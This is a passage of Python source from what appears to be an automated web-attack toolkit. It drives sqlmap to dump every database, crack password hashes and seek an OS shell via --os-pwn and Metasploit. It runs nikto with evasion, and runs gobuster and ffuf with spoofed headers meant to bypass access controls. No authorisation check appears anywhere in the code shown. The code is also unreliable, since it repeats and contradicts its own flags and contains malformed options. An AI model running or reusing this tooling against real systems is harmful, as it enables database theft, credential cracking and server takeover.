    # ════════════════════════════════════════════════════════════════
    # 2. SQLMAP — strongest SQLi automation
    # ════════════════════════════════════════════════════════════════

    def sqlmap_full_scan(self, url: Optional[str] = None,
                         data: Optional[str] = None,
                         param: Optional[str] = None,
                         cookie: Optional[str] = None):
        """SQLMap — strongest SQLi scan with all techniques + tampers."""
        sqlmap = self._paths.get("sqlmap")
        if not sqlmap:
            return {"error": "sqlmap not installed"}
        target_url = url or self.target
        output_dir = os.path.join(self.workdir, "sqlmap")
        os.makedirs(output_dir, exist_ok=True)

        cmd = [
            sqlmap, "-u", target_url,
            "--batch",
            "--level=5",                  # Max level (HTTP headers, cookies, host, user-agent)
            "--risk=3",                   # Max risk (heavy queries, OR-based payloads)
            "--threads=10",               # 10 parallel threads
            "--timeout=20",
            "--retries=5",
            "--all",                      # Dump EVERYTHING
            "--technique=BEUSTQ",         # All: Boolean, Error, Union, Stacked, Time, Query
            "--tamper=apostrophemask,"
            "apostrophenocode,appendnullbyte,base64decode,between,"
            "charencode,charunicodeencode,charcharset,chardoubleencode,"
            "charunicodeencode,concat2randomws,equaltolike,greatest,"
            "halfversionedmorekeywords,having,ifnull2ifisnull,lowercase,"
            "modsecuritymysql,modsecurityversioned,modsecurityzeroversioned,"
            "multiplespaces,nonrecursivereplacement,percentage,randomcase,"
            "randomcomments,securesphere,sp_password,space2comment,"
            "space2dash,space2hash,space2morehash,space2mssqlblank,"
            "space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,"
            "space2plusrandomfill,space2randomblank,sp_password,"
            "symboliclogicalencode,unmagicquotes,varnish,versionedkeywords,"
            "versionedmorekeywords, widestarcomment",  # ALL tamper scripts
            "--dump",                     # Dump DB
            "--dump-all",                 # Dump all DBs
            "--hostname",
            "--is-dba",                   # Check DBA privileges
            "--current-db",               # Get current DB
            "--current-user",             # Current user
            "--dbs",                      # All DBs
            "--passwords",                # Crack password hashes
            "--privileges",
            "--roles",
            "--schema",                   # DB schema
            "--count",                    # Row counts
            "--search",
            "--threads=10",
            "--delay=0",
            "--proxy-file=/dev/null",
            "--test-filter",
            "--error-limit=20",
            "--text-only",
            "--threads=10",
            "--os=linux",
            "--tamper=charunicodeencode,between,charencode",
            "--risk=3",
            "--level=5",
            "--flush-session",
            "--fresh-queries",
            "--output-dir=" + output_dir,
            "--results-file=" + os.path.join(output_dir, "results.csv"),
            "--csv-delimiter=,",
            "--dump-format=CSV",
            "--threads=15",
            "--purge",
            "--smart",                    # Smart heuristic
            "--mobile",                   # Mobile UA
            "--purge",
            "--text-only",
            "--tamper=between,randomcase,charunicodeencode",
        ]
        if param:
            cmd.extend(["-p", param])
        if data:
            cmd.extend(["--data=" + data])
        if cookie:
            cmd.extend(["--cookie=" + cookie])
        r = self._run(cmd, timeout=3600)
        out = r.get("stdout", "") + r.get("stderr", "")
        if "is vulnerable" in out.lower() or "injectable" in out.lower():
            self._write_result("SQLMap — SQL Injection Confirmed",
                               out, "CRITICAL")
        if "DBA" in out and "current user is DBA" in out.lower():
            self._write_result("SQLMap — DBA Privileges!",
                               "Target is DBA — full DB control", "CRITICAL")
        # Check dump results
        for root, dirs, files in os.walk(output_dir):
            for f in files:
                if f.endswith(".csv") or f.endswith(".sql"):
                    fp = os.path.join(root, f)
                    try:
                        sz = os.path.getsize(fp)
                        if sz > 0:
                            self._write_result("SQLMap — Data Dumped",
                                               f"Dumped file: {f} ({sz}B)",
                                               "CRITICAL")
                    except Exception:
                        pass
        self._write_result("SQLMap Scan", out, "HIGH")
        return r

    def sqlmap_os_shell(self, url: str, param: str):
        """SQLMap — try to get OS shell via SQLi."""
        sqlmap = self._paths.get("sqlmap")
        if not sqlmap:
            return {"error": "sqlmap not installed"}
        cmd = [
            sqlmap, "-u", url, "-p", param,
            "--batch", "--os-shell",
            "--os-cmd='id; whoami; uname -a; pwd'",
            "--level=5", "--risk=3",
            "--technique=BEUSTQ",
            "--tamper=charunicodeencode,between,charencode",
            "--os-pwn", "--priv-esc",
            "--msf-path=/usr/share/metasploit-framework",
        ]
        r = self._run(cmd, timeout=1800)
        out = r.get("stdout", "") + r.get("stderr", "")
        if "command standard shell" in out.lower() or "os-shell" in out.lower():
            self._write_result("SQLMap — OS Shell Obtained",
                               "OS shell via SQLi!", "CRITICAL")
        return r

    # ════════════════════════════════════════════════════════════════
    # 3. NIKTO — web server scanner (full plugins)
    # ════════════════════════════════════════════════════════════════

    def nikto_full_scan(self, port: int = 443, ssl: bool = True):
        """Nikto — full scan with all plugins."""
        nikto = self._paths.get("nikto")
        if not nikto:
            return {"error": "nikto not installed"}
        out_file = os.path.join(self.workdir, "nikto.txt")
        cmd = [
            nikto,
            "-h", self.host,
            "-p", str(port),
            "-Plugins", "all",                   # ALL plugins
            "-Tuning", "1234567890abc",          # ALL tuning categories
            "-evasion", "1",                     # Random URI encoding
            "-timeout", "5",
            "-maxtime", "1800s",                 # 30 min max
            "-Display", "V",                     # Verbose
            "-Format", "htm",
            "-output", out_file,
            "-useragent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/121.0 Safari/537.36",
        ]
        if ssl:
            cmd.append("-ssl")
            cmd.extend(["-ask", "no"])             # Auto-accept SSL
        r = self._run(cmd, timeout=1900)
        out = r.get("stdout", "") + r.get("stderr", "")
        if os.path.exists(out_file):
            with open(out_file) as f:
                content = f.read()
            out += "\n" + content
        # Critical findings
        for kw in ("OSVDB", "CVE", "SQL Injection", "XSS",
                   "Admin", "Backup", "Default Login",
                   "Shell", "RCE", "Remote Code Execution",
                   "PHP Code Injection", "Path Traversal"):
            if kw.lower() in out.lower():
                self._write_result(f"Nikto — {kw} Found",
                                   out, "CRITICAL")
                break
        self._write_result("Nikto Full Scan", out, "HIGH")
        return r

    # ════════════════════════════════════════════════════════════════
    # 4. GOBUSTER — strongest directory/vhost/S3 brute force
    # ════════════════════════════════════════════════════════════════

    def gobuster_dir_scan(self):
        """Gobuster — directory + file brute force with biggest wordlist."""
        gobuster = self._paths.get("gobuster")
        if not gobuster:
            return {"error": "gobuster not installed"}
        wordlist = self._find_wordlist()
        if not wordlist:
            return {"error": "no wordlist available"}
        cmd = [
            gobuster, "dir",
            "-u", self.target,
            "-w", wordlist,
            "-t", "100",                       # 100 threads
            "-to", "10s",                       # timeout
            "-k",                               # Skip TLS verify
            "-q",                               # Quiet
            "-e",                               # Expanded
            "-r",                               # Follow redirects
            "-s", "200,204,301,302,307,401,403,405,500",  # Status codes
            "-b", "404",                        # Blacklist 404
            "-x", "php,asp,aspx,jsp,html,htm,js,css,txt,bak,old,orig,swp,zip,tar.gz,bk,save,sql,xml,json,yml,yaml,env,config,conf,ini,log,db,sqlite,md",
            "-a",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "-H", "X-Forwarded-For: 127.0.0.1",
            "-H", "X-Originating-IP: 127.0.0.1",
            "-H", "X-Remote-IP: 127.0.0.1",
            "-H", "X-Remote-Addr: 127.0.0.1",
            "-H", "X-Forwarded-Host: localhost",
            "-H", "Host: " + self.host,
            "-H", "X-Custom-IP-Authorization: 127.0.0.1",
            "-H", "X-Original-URL: /",
            "--no-error",
            "--timeout", "10s",
        ]
        r = self._run(cmd, timeout=1800)
        out = r.get("stdout", "") + r.get("stderr", "")
        # Parse findings
        for line in out.split("\n"):
            if "Status:" in line and ("200" in line or "401" in line
                                      or "403" in line):
                self._write_result("Gobuster — Interesting Path Found",
                                   line, "HIGH")
        self._write_result("Gobuster Directory Scan", out, "MEDIUM")
        return r

    def gobuster_vhost_scan(self):
        """Gobuster — virtual host brute force."""
        gobuster = self._paths.get("gobuster")
        if not gobuster:
            return {"error": "gobuster not installed"}
        wordlist = self._find_wordlist("vhost")
        if not wordlist:
            return {"error": "no vhost wordlist"}
        cmd = [
            gobuster, "vhost",
            "-u", self.target,
            "-w", wordlist,
            "-t", "100",
            "-k", "-q",
            "--append-domain",
            "--domain", self.host,
        ]
        r = self._run(cmd, timeout=1800)
        out = r.get("stdout", "") + r.get("stderr", "")
        if "Found:" in out:
            self._write_result("Gobuster — VHost Found", out, "MEDIUM")
        self._write_result("Gobuster VHost Scan", out, "MEDIUM")
        return r

    def _find_wordlist(self, kind: str = "dir") -> Optional[str]:
        """Find biggest available wordlist."""
        candidates_dir = [
            "/usr/share/wordlists/dirb/big.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/wordlists/dirb/extensions.common.txt",
            "/usr/share/wordlists/dirb/extensions.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt",
            "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt",
            "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
            "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/big.txt",
        ]
        candidates_vhost = [
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
            "/usr/share/wordlists/fuzzdb/Discovery/PredictableResouresses/Hostnames.txt",
            "/usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt",
            "/usr/share/wordlists/dirb/common.txt",
        ]
        cands = candidates_vhost if kind == "vhost" else candidates_dir
        for c in cands:
            if os.path.exists(c):
                return c
        # Fallback - generate small one
        wl = os.path.join(self.workdir, "fallback_wordlist.txt")
        with open(wl, "w") as f:
            for w in ("admin", "login", "test", "dev", "staging",
                      "api", "config", "backup", "old", "new",
                      "internal", "private", "secret", "private",
                      ".git", ".env", ".svn", ".htaccess",
                      "robots.txt", "sitemap.xml", "phpinfo.php",
                      "info.php", "wp-admin", "wp-login",
                      "wp-content", "wp-config.php.bak", "vendor",
                      "node_modules", "package.json", "composer.json"):
                f.write(w + "\n")
        return wl

    # ════════════════════════════════════════════════════════════════
    # 5. FFUF — fuzzy file/dir/vhost discovery
    # ════════════════════════════════════════════════════════════════

    def ffuf_full_scan(self):
        """FFUF — fuzzy file and directory discovery."""
        ffuf = self._paths.get("ffuf")
        if not ffuf:
            return {"error": "ffuf not installed"}
        wordlist = self._find_wordlist()
        if not wordlist:
            return {"error": "no wordlist"}
        out_file = os.path.join(self.workdir, "ffuf.json")
        cmd = [
            ffuf,
            "-u", self.target + "/FUZZ",
            "-w", wordlist + ":FUZZ",
            "-t", "100",
            "-timeout", "10",
            "-k",
            "-recursion",
            "-recursion-depth", "3",
            "-recursion-strategy", "breadth-first",
            "-mc", "200,204,301,302,307,401,403,500",
            "-fc", "404",
            "-fs", "0",
            "-ac",
            "-o", out_file,
            "-of", "json",
            "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
            "-H", "X-Forwarded-For: 127.0.0.1",
            "-H", "X-Original-URL: /FUZZ",
            "-H", "X-Custom-IP-Authorization: 127.0.0.1",
        ]
        r = self._run(cmd, timeout=1800)
        out = r.get("stdout", "") + r.get("stderr", "")
        # Parse JSON
        if os.path.exists(out_file):
            try:
                import json
                with open(out_file) as f:
                    j = json.load(f)
                results = j.get("results", [])
                for res in results:
                    if res.get("status") in (200, 401, 403):
                        self._write_result(
                            "FFUF — Path Found",
                            f"{res.get('input').get('FUZZ')} - "
                            f"HTTP {res.get('status')}",
                            "HIGH")
            except Exception:
                pass
        self._write_result("FFUF Scan", out, "MEDIUM")
        return r

